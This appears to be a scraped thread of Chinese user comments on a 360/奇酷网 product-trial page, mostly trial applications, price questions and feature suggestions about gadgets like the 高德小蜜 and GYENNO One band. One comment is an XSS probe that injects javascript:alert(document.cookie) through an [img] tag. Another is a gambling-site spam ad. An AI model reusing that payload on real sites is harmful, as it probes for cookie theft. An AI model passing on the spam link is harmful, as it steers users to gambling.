不知道产品数据来自于那里，难道不是用国家气象局发布的信息吗？只有信息准确才有市场！
既然可以做WLAN发射器使用，干脆直接做成路由器吧！这样1.不至于让其WLAN功能成为摆设（因为不可能从路由器上分线接插座的）2.路由器一般在电脑桌旁边放着。和二为一，小改变，大改善。挺
喜欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。
傻逼玩意，骗人的
百分之50的运气加百分之50的人品就能得到了
支持好产品!
好东西,想拥有
“GYENNO One”看了这款智能手环的简介，喜欢的不得了，首先我是一名运动爱好者，跑步、爬山、骑行、是我每天生活必不可少的一部分，真的很希望我的每日运动数据可以出现在这款手环的智能屏幕中。期待自己有好运气可以有幸试用这款手环，他是我最喜欢的智能产品，绝对没有之一。想想打开手机蓝牙，连接智能手环，与身边的朋友一起亲身体验他的强大科技带给我们更多的生活乐趣。希望能有机会用精致的文字为他撰写体验报告
最好带太阳能充电
希望这次能成功！！！
........
感觉这款产品比较有创新哦，很不错，希望有机会试用哈
谢谢评论哦
希望被抽到
安卓要求太高了吧！
希望能中上上签
喜欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。 
说啥呢,还没用呢.用过再说.
就是个遥控器嘛 
整个主题都非常棒......唯独一个续航力直接一票否定!那么短的续航力无法达到实用级别.看来只能再加装一块微核电池了...
选我吧 给好好拍试用报告
我是一名职业摄影师 、之前有360随身Wi-Fi下载 撞进这里 一下就被吸引了 就发了申请 希望可通过 体验一下高科技产物 测评拍摄整理肯定是会用心的 希望幸运一次
能不能清楚故障码?东南蓝瑟能不能用?
很好,很对
我也是怎么弄都连不上 iPhone5的机子 ios7.1.2的系统
塑料泡沫的机身，拿到手，顿时傻了
我好喜欢啊
好的产品，我希望能抽到
产品介绍好诱人啊。。。。
里面还有一款飞行器很不错，能航拍的哦。。。。
喜欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。   
期待着一个为您全身心服务的智能环。
无线功能如何实现,乐测与手机连接?还是通过2g,3g网络?
真的假的？
真的假的？
回错了。。。
“GYENNO One”看了这款智能手环的简介，喜欢的不得了，首先我是一名运动爱好者，跑步、爬山、骑行、是我每天生活必不可少的一部分，真的很希望我的每日运动数据可以出现在这款手环的智能屏幕中。期待自己有好运气可以有幸试用这款手环，他是我最喜欢的智能产品，绝对没有之一。想想打开手机蓝牙，连接智能手环，与身边的朋友一起亲身体验他的强大科技带给我们更多的生活乐趣。希望能有机会用精致的文字为他撰写体验报告
喜欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。
随着智能穿戴设备的出现，各类眼镜、手环的层出不穷，高德地图智能穿戴设备的出现真是吓我一跳。。。作为一名技术控，一名IT工作者，原来并没有关注到奇酷，直到今天看到这个高德的智能硬件的出现。。几个功能来说也的确好用且超出了我的想象，便捷的各类一键功能肯定是相对普遍的，不过防丢功能却几乎亮瞎眼。。要知道市场上一个防丢功能的小玩意的价格也是过百的。拍照我觉得用来在行车遇到突发事件进行快速拍照更能体现价值。
很科幻的一款产品，功能看上去也很值得期待，但愿价格能让人接受。
现在市场上智能手环太多了，说实话早就想入手一个，但是已经看花了眼，不知道GYENNO One能给人带来一种什么样的客户体验呢。
老没货怎么回事？
现在卖吗，多少钱？
贵 少一位数我会买 
想看看,数码产品
希望可以体验一下小蜜带给我们生活的便捷
好期待自己可以有那个***的机会
为什么微博在这登不上
等待------是一个漫长的过程，但她毕竟是充满着希望！
看上去不错，很期待呀！
我是个运动控，最想得到每天精准的运动数据和健康状态指数，希望能在GYENNO One的帮助下提升运动幸福指数和更专业的运动体验。期待......
对人体有辐射吗？
哪里哪里哪里有？
产品不错，功能很实用
联想手机S800是透明屏幕的  可与考虑借鉴啊！！
尼玛,我上当了,志玲叫我免费试用....你妹啊.泪奔...
价格？？？？
希望可以体验一下小蜜带给我们方便
关注这个也有小半年了，一直想买，确一直没货卖；产品出不来就不要做那么早的推广吗，浪费表情，害人白等半年
这产品日本男人喜欢！矮子国喜欢这样的，怎么用你们董的
让早恋无处藏身
看的够仔细的啊！谢谢提醒，已修改。
http://luyou.360.cn/看官网，显示快有了
我也喜欢小黄人
手机下载乐测APP后，通过低功耗蓝牙4.0与乐测智能体温贴相连结的。
给中一个哦
好东西！！！！！
GYENNO One 智能手环 改变全世界  你我值得拥有~
描述得很详细啊！看来产品实用功能有待提升那！
小蜜，小蜜  带来  无限 无线  的 甜蜜 ，   期待体验 可爱的它。  已与男女朋友分享 ，后面也会按时完成试用报告。
希望可以体验一下小蜜带给我们生活的便捷
飘移的问题可以不拉直线，只标注链接时的点，然后在点的周围用半透明数字标注时间，这样，几个点的顺序就一目了然了。想要靠定位来画出路径，那至少得车载导航仪的大小啊！
好东西，想体验一下
觉得是否防水，这个很重要，洗手吃东西下雨运动出汗甚至游泳沐浴等，都有可能接触到水。另外，待机时间也非常重要，毕竟带着智能手表就是为了方便，总之，手表虽小，却要五脏俱全。面面俱到。细节决定一切，好的商品，自身就是广告，期待它会是个成功的产品吧。
我的精彩报告呢~
还有还有！最好有一个实体物理按键，按一下是快门，按两下是手机报警可以防盗，长按超过5秒关闭手环或者开启手环，这样对于晚上睡觉不准备带着手环或者长时间不能使用手环的人来说这样就更加节点了，倾斜亮屏在睡觉翻身或者运动的时候可能会误触，所以可以长按两秒打开倾斜手环亮屏这样就好多了！
如果不看背面我会果断买入
扫一扫，淘火眼不是已经可以通过二维码比价然后在搜索网店下单吗
不错的玩意儿，很想体验下
牛叉呀！我已好想自己试一下。 
你好！我们的标配已经从2700毫安的换成5400毫安的电池了，续航时间长达近30分钟。至于您说的微核电池，我们也是有在研发的；更多最新资讯都将通过我们的官方微信：EhangUAV，微博：亿航智能无人机 等平台发布，请留意关注！谢谢··
我想使用，这样电视都不要买了
那三个按键是做什么的
好专业的报告，说的很专业却又很容易懂，赞一个！
这玩意儿市场前景应该很不错的，只是看电量、功能之类的都有啥，没见过呀......
我也想要一个！
很想试试，开车有时不认识  老要停下来调导航
好产品，支持
好吧，又一个傍微信大腿的
最高功率多少？能用热水器不？ 感觉最需要用智能开关的是热水器，但是看过的智能开关都不能支持热水器3000瓦以上的功率
这个链接可以用： http://item.taobao.com/item.htm?spm=a1z10.1.w7323011-7094382899.1.m3GY8N&amp;id=38685461399 现价1899￥
中一个吧！！！！！！！！！！拜求人品不要太渣啊！！！！！！！！！！！！！！！！
希望尽快可以购买。。。
一架388￥！
你的想法才幼稚  如何充电？ 你确定家庭电压能充？  汽车上的电瓶你搬得动？  电池最多3年就要换 这些下来 绝对比加汽油贵 
穷人关心价格
你好，高德做了数据更新
求中。求中啊
很想试用小蜜是不是和林志玲一样的看起来甜蜜。
只要有创新，市场一定是你的啊
高德小蜜。守护着没有需要它的人。。。
高德小蜜。守护着每个需要它的人。。。 
不知道我是不是这款手环的幸运者
很想用用啊
388RMB
放你妈的p，4月米健就出了
就是，跟你一样傻逼
高端大气上档次，低调奢华有内涵 反正也没事干，写写申请吧，说不定能中呢嘿嘿
我想买个呀？什么时候可以买呀？多少米呀？
这个地图不会在手表里，所以上传位置点，在客户端通过地图生成路径不算难
还没得卖吗？希望尽快可以投入市场，还好，我还可以再等等，宝贝还很小，继续关注你哦，希望尽快！
我已经准备好了很多资料来写体验报告了~希望抽中我啊~求你了奇酷~
希望可以中奖吧，可以跟同事们炫耀炫耀
创建自己的购物清单，购物达人扫街必备哦！
创意不错！求试用！不知道什么时候产品可上市！！
一直信赖高德！这次很想第一时间体验高德神器的力量，提醒，导航等，做好试用报告！
BloomSky设备就是一个个人气象站，能够在你所在的位置提供实时的天气信息。
一直很喜欢
终于盼到高德地图小蜜面市了，期待应用功能更完善。
幸运大神降临于我身
你们可以看看oppo n1t手机！这就是模仿！！！！！oppo手机自带功能！侵略版权啊！！！你们可以自己看看！
低调奢华有内涵，很好看，希望能中奖
怎么从未申请成功~~~ 。
有实体键应该会影响它的防水效果把。但是我也希望能控制手机的相机快门
一定要防水的。
大概多少钱吖 
很多人睡觉其实不喜欢戴东西，好比我，这款产品有什么办法去解决这种问题？
很期待，好久上市？
希望幸运大神能降临于我身 
实际就是胶枪，其他不多说了！ 当然能玩很好，厂家不易，且用且珍惜。 多练多玩多享受！
相机没有设置好！╮(╯▽╰)╭不至于都不对焦呀！
1.确实感兴趣。 2.端正态度，认真对待。
很强大1啊！
功能强大，不知道价格如何？在网上看了GYENNO One 智能手环是839元有点吓人，希望产品价格平民化，不要老走高端人群。
我要我要  一定有我
小蜜 加油
如果取代车钥匙多好呀
添加超速提醒，一定给我一个呀，感谢！
外观真的是很满意，功能去繁从简。功能都很实用。自己觉得很满意，希望自己可以申请成功吧。
什么时间发布啊
最希望的反而是开车的时候，一按小蜜就把电话挂了！
等待------是一个漫长的过程，但她毕竟是充满着希望！ 
不带这样等的！都等N久了！啥时候发售呀！150个有17W人申请，玩人呀！
呵呵！！比较不错方便！ 
可否幸运降于吾身
功能很强大，期盼发布
起初对它很是期待，现在发现问题很多。对孩子的保护功能几乎没有。 还说什么最安全。太失望了。
手表在解开方面一点都没有设计。万一被人解开，那请问它还怎么保护孩子。
终于盼到高德地图小蜜面市了，期待应用功能更完善。 希望大神降临，呵呵。
幸运很少降临了
相信360会带来不一样的体验，智能家居，未来家居。
一键开启电话，一键接电话
这款产品本身比较轻薄，厚度才0.42cm,并且本身设计也充分符合人机贴合体验，并且运用特质覆膜胶贴，透气舒适，所以异物感很小，适合长时间贴合。
关心一下贫民
我也是这么想的：一键开启电话，一键接电话 
奇酷试用不错，高德小秘很诱人呀，希望能给个机会研究一番
在海里。。。 
与手机绑定，开车接电话老不方便了。地图能多点城市就好了
好....好期待呀
希望自己能够中一回
亲 这个是连续监测体温变化的
有了这个 ，开车时电话来了 再也不用手忙脚乱了
一键开启、接听电话。能够绑定车钥匙！！！
小蜜，加油！期待你们上市的火爆场面。
好东西，很期待有木有，很棒啊，真心喜欢！！！！
好像要啊 便宜点
等你，I need you
客户端申请不到，无法体验啊
就是像素差了点
额，支持哪些网站登陆? 
最为关注的功能是老人定位，期待能够抽中。阿弥陀佛，
很好！肯定要买一个！ 
价格高，还是一次性的！！！买不起啊！
要人经常到外地出差，希望能增加多个路线中转站的功能，同时也可以给宝宝或老人定位！期待能抽中
电量有点小
一键开启、接听电话。能够绑定车钥匙！
貌似很好 继续改进 
  免费试用，诱惑挺大的 功能也比较给力  点个赞！！！
一直有用高德呀。很好的软件，有了它，生活方便多了
不错的构思，希望可以试用。
最好再小点，可以放在汽车钥匙上
图片有点大， 加载慢， 加载完了，看得清楚
奇酷的东西，都是很有创意的东西。一直都很喜欢的
希望.....获奖
896 做问卷的时候说了
强大啊，科技的又一创新
小蜜这名字太贴切了，一直想把智键变成远程的，现在终于实现了，一定要得到
   喜欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。     另外希望小蜜在以后的创意中可以有接、打电话功能
符号表情太多了，另外你的指甲好长
感觉不错，只有试用体验才会感觉到
什么时候可以买呢？期待
这个产品现在很火爆啊。
极具创意和水平的评测啊，喜欢。。。
立马就想拥有啊
说不定等试用报告回收的差不多了，再发售吧
651226.com  杏彩娱乐贺喜
这个吗？看样子只能和keep智能防丢定位器一样。可惜了，就是不防水。能与高德地图完美的相连，这个可好。就是能把高灵敏蜂鸣器换成小喇叭就好啦！模仿警报的声音，值得改进。
一晚1度电...这个广告语？
4G网络啊
赞一下。格式可以在优化优化。
希望中标，很喜欢360的产品
好东西，好像要
优化了下，还有哪些需要改进的望指点
现在都普及了
用高德地图好长时间了  期待拥有一个试试
 小巧  带着方便 超喜欢  一直喜欢360出的产品   希望中奖！
 小巧  带着方便 超喜欢  一直喜欢360出的产品   希望中奖！
高德不错，
碉堡了。。 
已有亚马逊kindle。。。 期待Fire Phone 手机。。
好喜感的评测啊！哈哈
[img]javascript:alert(document.cookie)[/img]
1111111111111
瓦，好想要呀~我是学生，玩电脑时总被家长说，讨厌~
瓦，我稀饭你，么么哒~
唔……好想要，好想要，能申请试用，么么哒~~好时尚呀，能的话，回我一下，好么~
伊，看起来好棒呢，早就想换一步手机了~能试用么，多少钱呢~
LOVE YOU
时尚且实用的宝贝，一见钟情，期待可以亲身体验它的美好：）
评测很到位啊，看完有想买一个的冲动，请问此款手环现在发售了么？到哪可以买到？
看上去挺牛掰的，也很想拥有一个。还是会继续观察！！！
还有2个小时，希望抽中啊！
超级喜欢，每次开车都会使用高德，超棒！希望能都申请成功！！
多么希望自己能中
感谢支持……
值得拥有 推荐一下
喜欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。 另外希望小蜜在以后的创意中可以有接、打电话功能  
最好有一个实体物理按键，按一下是快门，按两下是手机报警可以防盗，长按超过5秒关闭手环或者开启手环，这样对于晚上睡觉不准备带着手环或者长时间不能使用手环的人来说这样就更加节点了，倾斜亮屏在睡觉翻身或者运动的时候可能会误触，所以可以长按两秒打开倾斜手环亮屏这样就好多了！
每次开车都会使用高德，超棒！希望能都申请成功！！ 
好....好期待呀  希望.....获奖还有还有！最好有一个实体物理按键，按一下是快门，按两下是手机报警可以防盗，长按超过5秒关闭手环或者开启手环，这样对于晚上睡觉不准备带着手环或者长时间不能使用手环的人来说这样就更加节点了，倾斜亮屏在睡觉翻身或者运动的时候可能会误触，所以可以长按两秒打开倾斜手环亮屏这样就好多了！ 
欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。 另外希望小蜜在以后的创意中可以有接、打电话功能  
奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。如果可以试用，我一定会把小蜜的各项功能使用到极致，而且也希望可以和身边的朋友们一起讨论和分项小蜜带给我们生活和驾乘方面的改变，写一篇客观、实用的体验报告。 另外希望小蜜在以后的创意中可以有接、打电话功能 
价格应该更亲民，走以量占市场法则！  搭配的像素应该更具有特色优势，这样更叫卖  另这个能飞多高？
期待 价格呢
太贵500大洋，宁可买2个充电宝也就200块钱
满满的等待与期盼！外观时尚简约，轻巧精致，功能实用方便，细致入微。从早至晚，甚至是我们处于睡眠中，都能帮助我们更健康规律的生活，烦杂的每天变得格外舒适，充实，井然有序。它的智能无声闹钟，运动监测，100%防水都是诱人之处。对于这样一款科技与生活结合的产品，让我爱不释手，怎能不尝试一下并且提出自己的观点和意见？由于是学生，是否购买还有待商榷。每天坐在电脑前等待，真心不希望这样一件酷品与自己擦肩而过。
可以购买的，现在京东就有卖的
一直在使用高德地图，有小蜜的帮助就更方便与快捷
科幻电影里的东西正在慢慢走进生活~科学进步真得好快~
文采还不错哟~
多谢,多谢鼓励
什么时候可以发售？请迅速啊！
拿到内测机机，可是二维码扫描出错肿么破
360的新产品吗？很不错的样子啊。
我想买但是价格我有点承受不起
真的喜欢，希望价钱亲民、
一直在使用高德地图，有小蜜的帮助就更方便与快捷。希望可以有幸体验一下小蜜带给我们生活的方便与快捷。我每次开车都会使用高德，超棒！希望能都申请成功！！
期待，外观简约不失活力，富有年轻人该有的内涵，便捷的操作方式不会给生活带来麻烦，充电只需轻轻一放，早上起床点击2下屏幕查看晚上的状态，而不是实体按键清脆而烦人的“咔咔”声，希望能获得试用，这个产品非常“舒适”
还有4分钟，希望获得试用。
共同努力！
期待 最后一分钟！！
正在筛选了，激动。
高德不错，速度挺快的
中啊，很激动，不知道有没有这么幸运 
多少钱呢？
增么收回呀，人家跑了，硬是不交，你能增么办，逼人交出？
真心希望要抽中。
一直在使用高德地图，有小蜜的帮助就更方便与快捷。希望可以有幸体验一下小蜜带给我们生活的方便与快捷，高德超棒！从10期到这一期，连续6期了，从没中过，希望这次能成功！！！谢谢，就算本期如果没有中，我也还会再试下去的，哪怕哪次中签了，我还是会继续试下去，我永远支持奇酷网，最喜欢奇酷网的试用频道了！！最后，我希望奇酷网继续努力，给我们的生活带来更多乐趣，谢谢！！！
从10期到这一期，连续5期了，到15期就连续6期了，从没中过，希望这次能成功！！！谢谢，就算本期如果没有中，我也还会再试下去的，哪怕哪次中签了，我还是会继续试下去，我永远支持奇酷网，最喜欢奇酷网的试用频道了！！最后，我希望奇酷网继续努力，给我们的生活带来更多乐趣，谢谢！！！ 
呵呵，等我有钱了
不会3D设计
值得试用，不错的选择！
被剪线了  怎么办？
出200元收一个小蜜的公测名额。
这个中他是会打电话过来还是怎么样    真心希望中啊  期待的.......
运动神器 希望你能够试用  跑步就不用带手机了
支不支持视频录制啊？回放之类的。
2200W,太耗能了！内置功能太多，发热，费电，是这个产品的弱点
为什么不是15号公测
期望获得试用，看起来很贴合我的需求！
好....好期待
好。。。好期待
好。。好像要
好。。。好叼哟
好。。。好想要哦
多么希望自己能够中
多么希望自己也中一回
好像要哦，看上去好棒哦
好像自己中一会
看上去好棒，可惜买不起
看上去好棒，可惜买不起
看起来好厉害的样子
最近忙死了，不能天天泡在奇酷世界里了，但每天我都会抽空来一次。
！第一次申请，激动\(≧▽≦)/ 
360产品支持，360的好几个产品都在等待正式发布
GPS ....我的行踪就完蛋了 应该把GPS去掉
想要但....没车。
都這時候了，還這麼配置電腦，我只能說不過如此。
这个不错，喜欢智能家居，有创意
很有未来科技感，定价也很亲民。
支持奇酷！
0.0.哇哇哇哇.
还想要啊！！！我都有10多期全没中，求小编一定要让我中啊！！！！！！！！
其实我已经第二次贩卖时在天猫抢到了…………但是我还是申请了（大家别说我哈，我也没中QAQ），因为想会不会这次改进发热，读写速度慢的问题…………事实上没有，不过还是支持360！
对哦，我当时还以为WiFi被黑客盗了，我还没意识到密码改了……急出一身汗囧QAQ。
欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下小蜜带给我们生活的方便与快捷，想一想小巧的外观设计、强大电子地图覆盖城市、防丢、远程快门等功能，期待不言而喻。希望可以申请到。
这个还是得看用户的人品了。大多数朋友还是非常好的，。
欢奇酷网带来的新鲜科技元素，希望可以有幸体验一下GYENNO One 智能手环给我们生活的方便与快捷。很希望我的每日运动数据可以出现在这款手环的智能屏幕中。期待自己有好运气可以有幸试用这款手环。希望我可以申请到。
长的不好看 其他还行
我家里有小孩和老人，这个很方便，请给个内测机会，谢谢！
我靠壕！！！为何跟我等屌丝抢名额捏？😢
1、产品尺寸多少；摄像头能控制旋转吗； 2、一部手机能装几个摄像头；是否能同时查看； 3、是否支持红外功能； 家里装了几个普通的摄像头，需要连接电脑或者机顶盒，比较麻烦，如果有wifi的那就太好了，什么时候试用，等待中
像我这种屌丝没车的。。就不跟你们争了。。我的目的是奇酷币。。谢谢。。
公司从事于智能家居开发，希望能够获得适用资格，谢谢。
不知道会不会中啊
真心想体验一下             ！！！！！！！！！！！！！！
给我个吧，我就没成功过
支持一下，期待更多创新产品
要不要钱的啊？
期盼中...
跟百度的小度功能一样。
看到了我最想看到的APP方面的内容，虽然有点乱，不过还是能够阅读，最后吐槽一下您的手，你懂得
仔细阅读功能发现还挺强大的，很适合配合开车使用！！！希望申请成功！
如果定价为99，我想 这款产品的热度肯定会超热360WIFI的。
神啊，让我试试吧，好神器...
发售就去抢……
淘宝早就有卖的了，还创意中？
啥时候开始啊，我需要你
作为一个屌丝，200元还是能拿得出来的。我已经在小蜜的官方论坛发帖了。有要转让公测的名额的联系我。。http://bbs.amap.com/thread-25500-1-1.html
淘bao早就有卖的了，不知道为啥还在创意中呢？
我也想试试呀、、、、、、能不能给我呀
眼睛蛇是你吗？
欧美开发的才1000RMB左右
牛逼了，360果然霸气
这个只是“天气报告”不是“天气预报”吧
360家庭卫士的app已经装了，就等摄像头了，看了一些简介，有几点需要关注：1、能不能和360安全路由器一起用，录像直接存储在云或者直接存在本地；2、能不能定时开关机，关机应该比较好解决，毕竟有无线wifi的经验了，开机比较麻烦，但是应该可以设定，技术已经比较成熟了；3、手机支持几个摄像头。
360家庭卫士的形象不符合当代的审美观。
之前就在想会不会有此类智能仪器被发明，看来已经十分接近了。继续努力吧
很吊炸天啊，希望能有机会试用
哇，期待测评哦，欢迎关注我们的公众账号bongcn参与投稿哦~
这个驾驶助手，类似腾讯路宝，早点回来更好！期待试用！
来来来，关注我们的公众账号bongcn哦，还有更多活动等你来~
多久能试用，比比腾讯路宝！顶奇酷
看简介，还不错啊
我想要这个！价格大概多少呐
必须开着且联网
8台手机使用
一定要选择啊啊！！！！O(∩_∩)O
非常非常期待，希望不要像百度那么坑。如果值得的话，第一时间收入。
哇，期待测评哦，欢迎关注我们的公众账号bongcn参与投稿哦~ 
来来来，关注我们的公众账号bongcn哦，还有更多活动等你来~ 
oh，期待测评···欢迎关注我们的公众账号bongcn参与投稿哦~  
新鲜测评出炉了咩···期待哦~别忘了关注我们的公众号bongcn第一时间获取消息哦
孩子放假了，正好需要买一个！
是呀是呀···欢迎关注bongcn，有各种好玩的等你来 
不感谢bong哦~%&gt;_&lt;%
期待你的试用报告~欢迎关注bongcn哦
这款电视盒已经可以购买了啊 为什么还显示创意中？？？
来吧！骚年，期待你的报告~欢迎关注bongcn~
同意 许多产品都出了 奇酷应该更新！
掌柜不在这里啊...
暑假必备 期待产品！
支持、很不错。
这款产品不错，期待
来电提醒，确实很实用！在外面的很多时候，漏接电话很烦~~
怎么联系掌柜的？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
360安全硬件。
这图片可以给厂商做宣传图了。
这个放在车里也不错啊。
这个适合放卧室，期待“门哨”……
有点意思   可以
快点开售！！！！！！！！
好酷啊，好想得到
神器一般都是神人能申请到。。。
看起来很不错的样子
继续支持...
估计还是彩色版，多买几个吧
好。。。好期待呀
之前相似产品有过多的了解，应该很棒！每每的关注，每每的参与。有求必应，志在必得。
作为运动手环不加入心率监测的话，是很不专业的，如果支持ANT协议的心率带也是好的。
其实还真不如一个HTPC,玩街机有模拟器，比用卡带方便多了，蓝光光驱什么的更便宜，软件选择面更广。
理念很先进，实际却是材料更贵，还要小心紫外线。
图片设计的不错，是自己弄的吗？
顶起！顶起！
希望申请成功！ 
运动神器 希望你能够试用 跑步就不用带手机了 
希望这次申请成功，支持奇酷！
申请从来没有被通过。。。
好期待啊，希望快点出来啊！
希望申请成功！
期待功能更强大一些，或者配件
申请体验，照看家里的宝宝，这样上班也能时刻关注在老家的宝宝了！
期待中............好东西。。支持..............
看到我流口水了，额额额。。。希望我也能通过，，。。。申请申请
东西不错，不过就国内的网络，室外实在是蛋疼，别说4G了，400G都没有
真棒，支持你，你是榜样，我的产品虽然没到，但是看着你的文章所介绍的产品真的好期待。
看着好酷%&gt;_&lt;%
真心想体验一下 ！！！！！！！！！！！！！！ 
快啊！我想要啊！
怎么感觉跟dropcam差不多啊
毕竟它很小
毕竟它很小
好啊！厉害！
我一定要，行么，志玲姐姐！
玲姐，留一个给我吧，太需要了
我们真诚来测试
我来了!360赞一个！！！
希望申请成功！
怎样才能申请成功呢？
 太实用了，希望我能拥有
话不多说，和我家的来比比那个好吧。
就等着我360自己的硬件登场呢
太棒了，永远支持360！
看起来就很不错。 
很好的东西
不知道卖多少钱呀···
好不错的评测，详细
好厉害，早点出来，有科幻电影的感觉。
功能很强大，不知道电池这块给不给力
实时监测用的吧。。
这手环漏电啊，哈哈哈哈
科技引领消费主张
真心想体验下   谢谢  好喜欢 
支持奇酷！  希望中签 ！！！@！
很期待哦！1！
感觉很不错额 ，，开车真的很需要 ，，
这个好东西。。。。。。
保佑中签！！！！
问一下儿童卫士2手表带sim卡，是不是意味着这就是一台手机，也有辐射，长期戴宝宝手上对健康有没有影响？你们评估过吗？安全吗？
呵呵，第一次来申请，好激动
第一次就看上这个了，申请得好激动。
运气的啊，看运气了。祝你我好运是吧？
如此环保。。好期待
窃听风云4
窃听风云4
直接把电力猫功能整进去吧
恩，这是一款着实不错的小东西，开车导航和家庭合拍 很适合。
WiFi芯片型号是那种？？？ 
电S不偿命 
谢谢鼓励与支持！！！
对呀~怎么了？  
科技改变生活，这类设备给了普通人、普通开发者快速体验体感的机会，并且提供了相应的开发平台支持，有想法的人可以利用这种新的交互模式来做新的东西。
OTTO更像一款玩具哦，很轻松的自己做动态图片，还可以分享给好友，挺有意思的！
棒！想要啊！！！！！！
一直在申请，从成功过，有点失望。
期待中！！！！！！！！！！
好东西啊，值得拥有
什么时候才有货啊！！？？花儿都射了
一直在申请，从成功过
支持、很不错。 360家庭卫士”智能摄像头，主打家庭远程监控功能，
支持，就是创意时间太慢，好多创意产品都无法快速实现让消费者使用！
不错，懒人必备。。。哈哈
为什么我申请了没拿到酷币呢!!!
好喜欢，在哪里可以购买到？？？？
这给力(*≧m≦*)
求种呀 。。。激激动动
想买....但是太贵了
360家庭卫士”智能摄像头，主打家庭远程监控功能，
呵呵，这么贵-，-
好想要哦..
呵呵，不算太贵
激动人心啊！！！！！！
求便宜...便宜就买
好少，期待我写的吧 
便宜就可以买了
希望得到啊    
用什么软件弄的呀？挺漂亮的。
不知道要多少钱
奇酷一辈子中一次就够了！
求中签呀！
白瞎给你试用了！！！！！！！！！！
haodongxi
看到了SD卡插，希望可以开发软件用于用户搭建私有云，用于企业监控，终结其他安防摄像头！
跟oppo的o click差不多啊
3000左右，我已经买了一个了，QQ 346477503
呵呵，第一次来申请，激动中···希望可以中···· 
对于长期在外的大学生可以更方便的看到家里，很喜欢，望早日可以购买
图片很漂亮 非常棒！！赞
产品真身还没看到。。期待持续更新
这个 图片能再规整一些不？就是有大有小的看着效果不是很好
这个还不是正式的评测哦。。。。。写报告需要一两天，这个发出来只是为了收集大家感兴趣的地方，方便优化报告(*^__^*) 
送给我吧。
运气砸在我身上吧！一定要成功。激动，
最想要这个了 希望能中  求人品爆发啊。。
希望得到啊//期待中！！！！！！
可以添加U盘存储功能，制作成耳环或项链或发卡等方便携带便于隐藏. 记录行驶轨迹等，做成手机遥控接收头 和播放器控制
音乐质量要好的话，确实可以当车载音响哦
不过当车载的话，网络连接是个问题哦
我有预感我要中了怎么办
太好了！！！！！！ 屏幕碎了再也不用抛手机了！！！
越薄越好！！
我感觉我们越来越在象那些科幻电影里的操作了！简直爽爆了
关注超多天，总是预约结束，你特么的奇虎360，你们要不要赚钱了,我要买呀！！！
就是就是！！！同感
感觉挺好玩的，像是在弄FLASH一样！
很贴心的东西！适合家里有老人的使用！能很好的看到他们的动向。
期待中，求中签。
我觉得我很需要一款这个玩意！虽然有点恨它，但是能养成好的习惯！谁在乎呢。
感觉这类产品出了很多
这个设计很早前就获得德国红点奖，现在才出现在市场上，还标示创意中~~无语！！！！！！
希望得到啊  
期待期待，超级需要哦
谢谢支持啦！
很多软件都可以噢！简单的话可以用美图秀秀~
求人品大爆发啊！
求人品大爆发啊！中啊  
就想要一个呢，好棒，好炫的说，求中签啊！！！！
期待ing啊，环保车呦！什么时候出啊，想要啊！！
辐射很大的,比福岛还厉害!
好厉害↖(^ω^)↗    详细又全面，还配有图片   给个赞！
还有抄袭图片的！噢我的天呐~~无奈了都！！！
还有抄袭的一说吗？哈哈！！！
是不是用了我两张图片呐？？？
运气真好 我都没有。。。
感觉是不错的 就是内部也不给个赠送试用  哎。。。
加油啊 期待更精准的定位
您是内部的？ 
长期关注奇酷一定会有的
看见你写的比较好……用了一张照片！！
看不懂配置  别装逼
你是我们这一期第一个收到产品的……也是第一个写报告的……我们这一期写的话差不多都会看看你是咋写的……用的你那张照片官网上也有……这不算抄吧！！！！
嗯嗯！我知道~没事的！！！
就那样吧！一般般~~~
晕的死哦，现在的热水器早就可以定时了，何须智能开关哦
还不错，不知道操控起来会不会太麻烦，不过以后就可以在床上或者在家外面遥控开关，是件很幸福的事！
这款淘宝上好像已经有了吧 
长期不在家，这个确实不错，家里老人，孩子可以远程了解情况了，希望能申请到
很喜欢这个外形！期待能快点来！
要是发售了，我要买十套，我太多东西容易丢啦 
非常好，现在安全产品让大家心安全。
额，人太多，不抱太大希望，才好，可是我想。。。。。。。。。。。。。
